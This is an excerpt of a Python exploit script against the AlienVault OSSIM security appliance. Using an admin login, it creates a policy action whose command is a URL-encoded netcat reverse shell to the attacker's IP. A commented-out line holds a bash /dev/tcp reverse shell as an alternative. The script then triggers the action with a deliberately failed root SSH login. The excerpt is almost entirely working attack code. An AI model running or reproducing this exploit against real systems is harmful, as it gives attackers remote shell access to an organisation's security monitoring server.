...
def createpolicy(ossimip):
    ...
    getctxurl = "https://"+ossimip+"/ossim/policy/policy.php?m_opt=configuration&sm_opt=threat_intelligence"
    policyurl = "https://"+ossimip+"/ossim/policy/newpolicy.php"
    reloadurl = "https://"+ossimip+"/ossim/conf/reload.php?what=policies&back=..%2Fpolicy%2Fpolicy.php"
    ...
    paramsauth = {'embed':'','bookmark_string':'','user':'admin','passu':ossimpass,'pass':base64string}
    #bashcommand = "bash+-i+%3E%26+%2Fdev%2Ftcp%2F"+localIP+"%2F12345+0%3E%261" #bash reverse shell
    netcatcommand = "nc+-e+%2Fbin%2Fsh+"+localIP+"+12345" #netcat reverse shell
    paramsaction = "id=&action=new&old_name=&action_name=testossim&old_descr=&descr=testossim&action_type=2&only=on&cond=True&email_from=&email_to=&email_subject=&email_message=&exec_command="+netcatcommand+"&transferred_user="
    ...
    try:
        ...
        if (action.status_code == 200 and "Action successfully updated" in action.text):
            actions = s.post(getactionurl, data="page=1&rp=20&sortname=descr&sortorder=asc&query=&qtype=", verify=False)
...
def generatesshevent(ossimip):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(ossimip, username='root', password='0ss1mr4nd0mp4ssw0rd') #wrong password to generate failed ssh login event
